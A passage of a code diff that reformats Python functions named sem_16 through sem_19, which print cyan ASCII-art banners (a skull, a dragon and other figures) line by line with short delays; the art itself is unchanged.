+  time.sleep(0.01)
+  print(cyan + """        @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """      @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """    @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """   @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """    @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan +
+        """      @@@@@@@                        @@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """        @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """            @@@@@@@@@@@@@@@@@@@@@@@@@@              """)
+  time.sleep(0.01)
+  print(cyan + """              @@@@@@@@@@@@@@@@@@@@@@              """)
+
+
 def sem_16():
- time.sleep(0.01)
- print(cyan +"""                                         .,,cccd$$$$$$$$$$$ccc,              """)
- time.sleep(0.01)
- print(cyan +"""                                     ,cc$$$$$$$$$$$$$$$$$$$$$$$$$cc,              """)
- time.sleep(0.01)
- print(cyan +"""                                   ,d$$$$$$$$$$$$$$$$"J$$$$$$$$$$$$$$c,              """)
- time.sleep(0.01)
- print(cyan +"""                                 d$$$$$$$$$$$$$$$$$$,$" ,,`?$$$$$$$$$$$$L              """)
- time.sleep(0.01)
- print(cyan +"""                               ,$$$$$$$$$$$$$$$$$$$$$',J$$$$$$$$$$$$$$$$$b              """)
- time.sleep(0.01)
- print(cyan +"""                              ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i `$h              """)
- time.sleep(0.01)
- print(cyan +"""                              $$$$$$$$$$$$$$$$$$$$$$$$$P'  "$$$$$$$$$$$h $$              """)
- time.sleep(0.01)
- print(cyan +"""                             ;$$$$$$$$$$$$$$$$$$$$$$$$F,$$$h,?$$$$$$$$$$h$F              """)
- time.sleep(0.01)
- print(cyan +"""                             `$$$$$$$$$$$$$$$$$$$$$$$F:??$$$:)$$$$P",. $$F              """)
- time.sleep(0.01)
- print(cyan +"""                              ?$$$$$$$$$$$$$$$$$$$$$$(   `$$ J$$F"d$$F,$F              """)
- time.sleep(0.01)
- print(cyan +"""                               ?$$$$$$$$$$$$$$$$$$$$$h,  :P'J$$F  ,$F,$"              """)
- time.sleep(0.01)
- print(cyan +"""                                ?$$$$$$$$$$$$$$$$$$$$$$$ccd$$`$h, ",d$              """)
- time.sleep(0.01)
- print(cyan +"""                                 "$$$$$$$$$$$$$$$$$$$$$$$$",cdc $$$$"              """)
- time.sleep(0.01)
- print(cyan +"""                        ,uu,      `?$$$$$$$$$$$$$$$$$$$$$$$$$$$c$$$$h              """)
- time.sleep(0.01)
- print(cyan +"""                    .,d$$$$$$$cc,   `$$$$$$$$$$$$$$$$??$$$$$$$$$$$$$$$,              """)
- time.sleep(0.01)
- print(cyan +"""                  ,d$$$$$$$$$$$$$$$bcccc,,??$$$$$$ccf `"??$$$$??$$$$$$$              """)
- time.sleep(0.01)
- print(cyan +"""                 d$$$$$$$$$$$$$$$$$$$$$$$$$h`?$$$$$$h`:...  d$$$$$$$$P              """)
- time.sleep(0.01)
- print(cyan +"""                d$$$$$$$$$$$$$$$$$$$$$$$$$$$$`$$$$$$$hc,,cd$$$$$$$$P"              """)
- time.sleep(0.01)
- print(cyan +"""            =$$?$$$$$$$$P' ?$$$$$$$$$$$$$$$$$;$$$$$$$$$???????",,              """)
- time.sleep(0.01)
- print(cyan +"""               =$$$$$$F       `"?????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$bc              """)
- time.sleep(0.01)
- print(cyan +"""               d$$F"?$$k ,ccc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i              """)
- time.sleep(0.01)
- print(cyan +"""        .     ,ccc$$c`""u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",$$$$$$$$$$$$h              """)
- time.sleep(0.01)
- print(cyan +"""     ,d$$$L  J$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" `""$$$??$$$$$$$              """)
- time.sleep(0.01)
- print(cyan +"""   ,d$$$$$$c,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       `?J$$$$$$$'              """)
- time.sleep(0.01)
- print(cyan +"""  ,$$$$$$$$$$h`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F           ?$$$$$$$P""=,              """)
- time.sleep(0.01)
- print(cyan +""" ,$$$F?$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F              3$$$$II"?$h,              """)
- time.sleep(0.01)
- print(cyan +""" $$$$$`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P"               ;$$$??$$$,"?"              """)
- time.sleep(0.01)
- print(cyan +""" $$$$F ?$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",z'                3$$h   ?$F              """)
- time.sleep(0.01)
- print(cyan +"""        `?$$$$$$$$$$$$$$$??$$$$$$$$$PF"',d$P"                  "?$F              """)
- time.sleep(0.01)
- print(cyan +"""           """""""         ,z$$$$$$$$$$$$$P              """)
- time.sleep(0.01)
- print(cyan +"""                          J$$$$$$$$$$$$$$F              """)
- time.sleep(0.01)
- print(cyan +"""                         ,$$$$$$$$$$$$$$F              """)
- time.sleep(0.01)
- print(cyan +"""                         :$$$$$c?$$$$PF'              """)
- time.sleep(0.01)
- print(cyan +"""                         `$$$$$$$P              """)
- time.sleep(0.01)
- print(cyan +"""                          `?$$$$F              """)
- time.sleep(0.01)
- 
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                         .,,cccd$$$$$$$$$$$ccc,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                     ,cc$$$$$$$$$$$$$$$$$$$$$$$$$cc,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                   ,d$$$$$$$$$$$$$$$$"J$$$$$$$$$$$$$$c,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                 d$$$$$$$$$$$$$$$$$$,$" ,,`?$$$$$$$$$$$$L              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                               ,$$$$$$$$$$$$$$$$$$$$$',J$$$$$$$$$$$$$$$$$b              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                              ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i `$h              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                              $$$$$$$$$$$$$$$$$$$$$$$$$P'  "$$$$$$$$$$$h $$              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                             ;$$$$$$$$$$$$$$$$$$$$$$$$F,$$$h,?$$$$$$$$$$h$F              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                             `$$$$$$$$$$$$$$$$$$$$$$$F:??$$$:)$$$$P",. $$F              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                              ?$$$$$$$$$$$$$$$$$$$$$$(   `$$ J$$F"d$$F,$F              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                               ?$$$$$$$$$$$$$$$$$$$$$h,  :P'J$$F  ,$F,$"              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                ?$$$$$$$$$$$$$$$$$$$$$$$ccd$$`$h, ",d$              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                                 "$$$$$$$$$$$$$$$$$$$$$$$$",cdc $$$$"              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                        ,uu,      `?$$$$$$$$$$$$$$$$$$$$$$$$$$$c$$$$h              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                    .,d$$$$$$$cc,   `$$$$$$$$$$$$$$$$??$$$$$$$$$$$$$$$,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                  ,d$$$$$$$$$$$$$$$bcccc,,??$$$$$$ccf `"??$$$$??$$$$$$$              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                 d$$$$$$$$$$$$$$$$$$$$$$$$$h`?$$$$$$h`:...  d$$$$$$$$P              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                d$$$$$$$$$$$$$$$$$$$$$$$$$$$$`$$$$$$$hc,,cd$$$$$$$$P"              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """            =$$?$$$$$$$$P' ?$$$$$$$$$$$$$$$$$;$$$$$$$$$???????",,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """               =$$$$$$F       `"?????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$bc              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """               d$$F"?$$k ,ccc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        .     ,ccc$$c`""u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",$$$$$$$$$$$$h              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     ,d$$$L  J$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" `""$$$??$$$$$$$              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """   ,d$$$$$$c,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       `?J$$$$$$$'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  ,$$$$$$$$$$h`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F           ?$$$$$$$P""=,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ ,$$$F?$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F              3$$$$II"?$h,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ $$$$$`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P"               ;$$$??$$$,"?"              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ $$$$F ?$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",z'                3$$h   ?$F              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """        `?$$$$$$$$$$$$$$$??$$$$$$$$$PF"',d$P"                  "?$F              """
+  )
+  time.sleep(0.01)
+  print(cyan + """           """
+        """"         ,z$$$$$$$$$$$$$P              """)
+  time.sleep(0.01)
+  print(cyan + """                          J$$$$$$$$$$$$$$F              """)
+  time.sleep(0.01)
+  print(cyan + """                         ,$$$$$$$$$$$$$$F              """)
+  time.sleep(0.01)
+  print(cyan + """                         :$$$$$c?$$$$PF'              """)
+  time.sleep(0.01)
+  print(cyan + """                         `$$$$$$$P              """)
+  time.sleep(0.01)
+  print(cyan + """                          `?$$$$F              """)
+  time.sleep(0.01)
+
+
 def sem_17():
- time.sleep(0.01)
- print(cyan +""" ,                                                               ,              """)
- time.sleep(0.01)
- print(cyan +""" \'.                                                           .'/              """)
- time.sleep(0.01)
- print(cyan +"""  ),\                                                         /,(               """)
- time.sleep(0.01)
- print(cyan +""" /__\'.                                                     .'/__\              """)
- time.sleep(0.01)
- print(cyan +""" \  `'.'-.__                                           __.-'.'`  /              """)
- time.sleep(0.01)
- print(cyan +"""  `)   `'-. \                                         / .-'`   ('              """)
- time.sleep(0.01)
- print(cyan +"""  /   _.--'\ '.          ,               ,          .' /'--._   \              """)
- time.sleep(0.01)
- print(cyan +"""  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|              """)
- time.sleep(0.01)
- print(cyan +"""  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /              """)
- time.sleep(0.01)
- print(cyan +"""   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`              """)
- time.sleep(0.01)
- print(cyan +"""     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(              """)
- time.sleep(0.01)
- print(cyan +"""    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \              """)
- time.sleep(0.01)
- print(cyan +"""    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /              """)
- time.sleep(0.01)
- print(cyan +"""     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('              """)
- time.sleep(0.01)
- print(cyan +"""     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\              """)
- time.sleep(0.01)
- print(cyan +"""     \     .'`_.--'          \\     //          `--._`'.     /              """)
- time.sleep(0.01)
- print(cyan +"""      '-._' /`            _   \\-.-//   _            `\ '_.-'              """)
- time.sleep(0.01)
- print(cyan +"""          `<     _,..--''`|    \`"`/    |`''--..,_     >`              """)
- time.sleep(0.01)
- print(cyan +"""           _\  ``--..__   \     `'`     /   __..--``  /_              """)
- time.sleep(0.01)
- print(cyan +"""          /  '-.__     ``'-;    / \    ;-'``     __.-'  \              """)
- time.sleep(0.01)
- print(cyan +"""         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |              """)
- time.sleep(0.01)
- print(cyan +"""         \     '-.       /   |/--|--\|   \       .-'     /              """)
- time.sleep(0.01)
- print(cyan +"""          '-._    '-._  /    |---|---|    \  _.-'    _.-'              """)
- time.sleep(0.01)
- print(cyan +"""              `'-._   '/ / / /---|---\ \ \ \'   _.-'`              """)
- time.sleep(0.01)
- print(cyan +"""                   '-./ / / / \`---`/ \ \ \ \.-'              """)
- time.sleep(0.01)
- print(cyan +"""                       `)` `  /'---'\  ` `(`              """)
- time.sleep(0.01)
- print(cyan +"""                 jgs  /`     |       |     `\              """)
- time.sleep(0.01)
- print(cyan +"""                     /  /  | |       | |  \  \              """)
- time.sleep(0.01)
- print(cyan +"""                 .--'  /   | '.     .' |   \  '--.              """)
- time.sleep(0.01)
- print(cyan +"""                /_____/|  / \._\   /_./ \  |\_____\              """)
- time.sleep(0.01)
- print(cyan +"""               (/      (/'     \) (/     `\)      \)              """)
- time.sleep(0.01)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ ,                                                               ,              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ \'.                                                           .'/              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  ),\                                                         /,(               """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ /__\'.                                                     .'/__\              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """ \  `'.'-.__                                           __.-'.'`  /              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  `)   `'-. \                                         / .-'`   ('              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  /   _.--'\ '.          ,               ,          .' /'--._   \              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """     \     .'`_.--'          \\     //          `--._`'.     /              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """      '-._' /`            _   \\-.-//   _            `\ '_.-'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          `<     _,..--''`|    \`"`/    |`''--..,_     >`              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """           _\  ``--..__   \     `'`     /   __..--``  /_              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          /  '-.__     ``'-;    / \    ;-'``     __.-'  \              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """         \     '-.       /   |/--|--\|   \       .-'     /              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """          '-._    '-._  /    |---|---|    \  _.-'    _.-'              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """              `'-._   '/ / / /---|---\ \ \ \'   _.-'`              """
+  )
+  time.sleep(0.01)
+  print(cyan +
+        """                   '-./ / / / \`---`/ \ \ \ \.-'              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                       `)` `  /'---'\  ` `(`              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 jgs  /`     |       |     `\              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                     /  /  | |       | |  \  \              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                 .--'  /   | '.     .' |   \  '--.              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                /_____/|  / \._\   /_./ \  |\_____\              """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """               (/      (/'     \) (/     `\)      \)              """)
+  time.sleep(0.01)
+
 
 def sem_18():
- time.sleep(0.01)
- print(cyan +'''                          ooo              ''')
- time.sleep(0.01)
- print(cyan +'''                         $ o$              ''')
- time.sleep(0.01)
- print(cyan +'''                        o $$              ''')
- time.sleep(0.01)
- print(cyan +'''              ""$$$    o" $$ oo "              ''')
- time.sleep(0.01)
- print(cyan +'''          " o$"$oo$$$"o$$o$$"$$$$$ o              ''')
- time.sleep(0.01)
- print(cyan +'''         $" "o$$$$$$o$$$$$$$$$$$$$$o     o              ''')
- time.sleep(0.01)
- print(cyan +'''      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o              ''')
- time.sleep(0.01)
- print(cyan +'''     " "     o  "$$$o   o$$$$$$$$$$$oo$$              ''')
- time.sleep(0.01)
- print(cyan +'''    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o              ''')
- time.sleep(0.01)
- print(cyan +'''  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "              ''')
- time.sleep(0.01)
- print(cyan +''' o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $              ''')
- time.sleep(0.01)
- print(cyan +''' $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o              ''')
- time.sleep(0.01)
- print(cyan +'''o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o              ''')
- time.sleep(0.01)
- print(cyan +'''"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "              ''')
- time.sleep(0.01)
- print(cyan +'''"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o              ''')
- time.sleep(0.01)
- print(cyan +'''$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "              ''')
- time.sleep(0.01)
- print(cyan +'''$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o              ''')
- time.sleep(0.01)
- print(cyan +''' o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o              ''')
- time.sleep(0.01)
- print(cyan +''' "  " o  o$o" $$$$o   ""           o  o$$$$$"   o              ''')
- time.sleep(0.01)
- print(cyan +'''  $         o$$$$$$$oo            "oo$$$$$$$"    o              ''')
- time.sleep(0.01)
- print(cyan +'''  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o              ''')
- time.sleep(0.01)
- print(cyan +'''    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"              ''')
- time.sleep(0.01)
- print(cyan +'''     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"              ''')
- time.sleep(0.01)
- print(cyan +'''        "" $$$$$$$$$$$$$$$$$$$$$$" """"              ''')
- time.sleep(0.01)
- print(cyan +'''                         """"""              ''')
- time.sleep(0.01)
- 
+  time.sleep(0.01)
+  print(cyan + '''                          ooo              ''')
+  time.sleep(0.01)
+  print(cyan + '''                         $ o$              ''')
+  time.sleep(0.01)
+  print(cyan + '''                        o $$              ''')
+  time.sleep(0.01)
+  print(cyan + '''              ""$$$    o" $$ oo "              ''')
+  time.sleep(0.01)
+  print(cyan + '''          " o$"$oo$$$"o$$o$$"$$$$$ o              ''')
+  time.sleep(0.01)
+  print(cyan + '''         $" "o$$$$$$o$$$$$$$$$$$$$$o     o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o              ''')
+  time.sleep(0.01)
+  print(cyan + '''     " "     o  "$$$o   o$$$$$$$$$$$oo$$              ''')
+  time.sleep(0.01)
+  print(cyan + '''    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "              ''')
+  time.sleep(0.01)
+  print(cyan +
+        ''' o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $              ''')
+  time.sleep(0.01)
+  print(cyan +
+        ''' $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o              ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o              ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "              ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o              ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      ''' o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        ''' "  " o  o$o" $$$$o   ""           o  o$$$$$"   o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''  $         o$$$$$$$oo            "oo$$$$$$$"    o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"              ''')
+  time.sleep(0.01)
+  print(cyan + '''        "" $$$$$$$$$$$$$$$$$$$$$$" """"              ''')
+  time.sleep(0.01)
+  print(cyan + '''                         """"""              ''')
+  time.sleep(0.01)
+
+
 def sem_19():
- time.sleep(0.01)
- print(cyan +"""                        ,mmmmm,            ______     _________              """)
- time.sleep(0.01)
- print(cyan +"""                        @ooooo@,         / /. . \\   /./-----\.\              """)
- time.sleep(0.01)
- print(cyan +"""                        @0m0m0Q@        / /. . .`,\\>./,  ,  ,\.\              """)
- time.sleep(0.01)
- print(cyan +"""                        @0X00X@@       | |. . .  |:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                     ____@0m00@_____   | | . . . |:|X| ,  ,  , |.|              """)
- time.sleep(0.01)
- print(cyan +"""                    @@@op(oboy)pop@@Ok | |. . .  |:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                   @@@@opopopopop@@@p@@| | . . . |:|\| ,  ,  , |.|              """)
- time.sleep(0.01)
- print(cyan +"""                   @@o@@opopopopop@@op@@,|. . .  |:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                   @@o@@popopopopopop@o@@| . . . |:|X| ,  ,  , |.|              """)
- time.sleep(0.01)
- print(cyan +"""                    @@o@@mmmmmmgogogo@oo@|. . .  |:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                     @@@@@@@mmm'ooo@|@oo@| . . . |:|\| ,  ,  , |.|              """)
- time.sleep(0.01)
- print(cyan +"""                      @oooooooOOOO@"  @o@|. . .  |:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                      @OoOoO@OoOoO@   @@@| . . . |:|X| ,  ,  , |.|              """)
- time.sleep(0.01)
- print(cyan +"""                      @oooo@@@oooo@   @@@|. . . .|:|\|   ,  ,  |.|              """)
- time.sleep(0.01)
- print(cyan +"""                     .@@@o@@@@ooo@@  ,@@}| . . .//  \\_________/.|              """)
- time.sleep(0.01)
- print(cyan +"""                    .@@oo@@@@@@ooo@. "@@'|. . //     \==========/              """)
- time.sleep(0.01)
- print(cyan +"""                   .@ooooo@@@@@oooo@      \ //              """)
- time.sleep(0.01)
- print(cyan +"""                   @ooooO@' `@@ooo@|              """)
- time.sleep(0.01)
- print(cyan +"""                   @oooo@'   `@oooo@              """)
- time.sleep(0.01)
- print(cyan +"""                  @ooo@'     `oooo@|                    """)
- time.sleep(0.01)
- print(cyan +"""                  @oo@@'      `@oo@|                    """)
- time.sleep(0.01)
- print(cyan +"""                  @o@@|        @@o@,                         """)
- time.sleep(0.01)
- print(cyan +"""                  @@@@:        @@o@|                              """)
- time.sleep(0.01)
- print(cyan +"""                  @@@@:        @@o@|                        """)
- time.sleep(0.01)
- print(cyan +"""                  `@oo:        `@@@:              """)
- time.sleep(0.01)
- print(cyan +"""                  /@@@)        /@@@)              """)
- time.sleep(0.01)
- print(cyan +"""                (@@@@/       (@@@@/                        """)
- time.sleep(0.01)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                        ,mmmmm,            ______     _________              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                        @ooooo@,         / /. . \\   /./-----\.\              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                        @0m0m0Q@        / /. . .`,\\>./,  ,  ,\.\              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                        @0X00X@@       | |. . .  |:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                     ____@0m00@_____   | | . . . |:|X| ,  ,  , |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                    @@@op(oboy)pop@@Ok | |. . .  |:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                   @@@@opopopopop@@@p@@| | . . . |:|\| ,  ,  , |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                   @@o@@opopopopop@@op@@,|. . .  |:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                   @@o@@popopopopopop@o@@| . . . |:|X| ,  ,  , |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                    @@o@@mmmmmmgogogo@oo@|. . .  |:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                     @@@@@@@mmm'ooo@|@oo@| . . . |:|\| ,  ,  , |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                      @oooooooOOOO@"  @o@|. . .  |:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                      @OoOoO@OoOoO@   @@@| . . . |:|X| ,  ,  , |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                      @oooo@@@oooo@   @@@|. . . .|:|\|   ,  ,  |.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                     .@@@o@@@@ooo@@  ,@@}| . . .//  \\_________/.|              """
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                    .@@oo@@@@@@ooo@. "@@'|. . //     \==========/              """
+  )
+  time.sleep(0.01)
+  print(cyan +
+        """                   .@ooooo@@@@@oooo@      \ //              """)
+  time.sleep(0.01)
+  print(cyan + """                   @ooooO@' `@@ooo@|              """)
+  time.sleep(0.01)
+  print(cyan + """                   @oooo@'   `@oooo@              """)
